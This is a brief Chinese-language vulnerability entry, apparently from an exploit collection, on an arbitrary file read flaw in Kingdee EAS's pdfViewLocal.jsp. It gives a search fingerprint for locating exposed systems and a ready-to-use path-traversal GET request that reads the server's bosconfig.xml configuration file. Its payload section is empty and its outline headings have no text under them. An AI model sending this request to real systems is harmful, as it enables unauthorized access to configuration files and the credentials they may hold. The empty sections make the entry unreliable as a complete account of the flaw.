# 金蝶EASpdfViewLocal存在任意文件读取漏洞

- **系统**：金蝶　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app="Kingdee-EAS"`
- **请求**：`GET /easweb/logout/../cp/dm/pdfViewLocal.jsp?path=../config/bosconfig.xml HTTP/1.1`
- **关键头**：`Cookie: acw_tc=0bca38ce17050645324247547ec809c86d7664848be4554565a3f1dc03c624; EASSESSIO…`　`Sec-Fetch-User: ?1`

**请求体 / payload**
```

```

**其他**
- 金蝶EAS pdfViewLocal存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 金蝶EAS